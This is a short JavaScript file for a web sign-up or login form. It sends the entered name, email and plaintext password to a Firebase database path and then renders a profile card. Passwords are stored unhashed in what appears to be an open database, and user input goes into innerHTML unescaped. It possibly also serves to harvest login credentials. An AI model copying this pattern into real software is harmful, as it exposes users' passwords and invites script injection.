document.addEventListener('DOMContentLoaded', function () {
    // Register form submission
    document.querySelector('.my-login-validation').addEventListener('submit', function (e) {
        e.preventDefault();
        register();
    });

    function register() {
        // Get form values
        const name = document.getElementById('name')? document.getElementById('name').value: document.getElementById('email').value;
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        // Validate form
        if (!name || !email || !password) {
            alert('Please fill out all fields');
            return;
        }

        // Data to be sent
        const data = {
            name: name,
            email: email,
            password: password
        };

        // Post data to Firebase
        fetch('https://prometheusr2-d51b2-default-rtdb.firebaseio.com/posts.json', {
            method: 'POST',
            body: JSON.stringify(data),
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(response => response.json())
        .then(data => {
            console.log('Success:', data);
            displayRegistrationDetails(name, email, password);
        })
        .catch((error) => {
            console.error('Error:', error);
        });
    }

    function displayRegistrationDetails(name, email, password) {
        // Hide the registration form card
        document.querySelector('.card-wrapper').style.display = 'none';

        // Display registration details
        const registrationDetailsDiv = document.getElementById('registration-details');
        registrationDetailsDiv.innerHTML = `
            <div class="card">
                <div class="card-body">
                    <h5 class="card-title">User Profile</h5>
                    <p><strong>Name:</strong> ${name}</p>
                    <p><strong>Email:</strong> ${email}</p>
                </div>
            </div>
        `;
    }
});
